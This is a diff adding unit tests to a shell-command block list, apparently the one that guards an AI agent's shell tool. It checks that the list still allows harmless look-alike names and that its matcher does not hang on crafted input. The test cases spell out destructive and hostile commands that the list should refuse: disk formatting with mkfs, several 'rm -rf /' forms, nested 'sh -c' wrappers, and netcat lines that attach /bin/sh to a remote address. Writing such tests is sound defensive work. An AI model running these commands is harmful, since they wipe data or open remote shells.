@@ -275,3 +275,46 @@ describe('peeling reaches the command through stacked wrappers', () => {
     expect(matchElevatedCommand('env A=1 npm run sudo-check')).toBeNull();
   });
 });
+
+describe('a name that continues, versus a name that ends', () => {
+  it.each([
+    'mkfs.ext4 /dev/sda1',
+    'mkfs.vfat /dev/sdb',
+    'nc.openbsd -e /bin/sh 1.1.1.1 22',
+    'ncat.traditional -e /bin/sh',
+    'rm -rf //',
+    'rm -rf ~/',
+    'rm -rf /.',
+  ])('refuses %s', (command) => {
+    // A dot, slash or tilde ends a command name rather than continuing it.
+    // Treating them as continuations left the `mkfs` entry dead outright —
+    // `mkfs.<fstype>` IS how mkfs is invoked — and let the real `nc` binaries
+    // through under their packaged names.
+    expect(commandPolicyViolation(command)).toMatch(/Blocked command detected/);
+  });
+
+  it.each(['ncdu /var/log', 'haltcheck --x y', 'shutdownctl --status', 'netcatalog list'])(
+    'still allows %s',
+    (command) => {
+      // A letter, digit or dash DOES continue a name.
+      expect(commandPolicyViolation(command)).toBeNull();
+    },
+  );
+});
+
+describe('the matcher is not a denial-of-service surface', () => {
+  it('handles a command dense with -c tokens in bounded time', () => {
+    // Recursing per `-c` on the remaining suffix is 2^n: 16 tokens measured 6s
+    // of blocked event loop and 20 overflowed the stack — on the path
+    // `ShellTool.validateCommand` runs for every `shell__run`, with no length
+    // cap in front of it.
+    const nasty = Array.from({ length: 40 }, (_, i) => (i % 2 ? '-c' : 'x')).join(' ');
+    const started = Date.now();
+    expect(() => commandPolicyViolation(nasty)).not.toThrow();
+    expect(Date.now() - started).toBeLessThan(1_000);
+  });
+
+  it('still finds a blocked command nested behind several -c hops', () => {
+    expect(commandPolicyViolation('sh -c "sh -c \'rm -rf /\'"')).toMatch(/Blocked command detected/);
+  });
+});
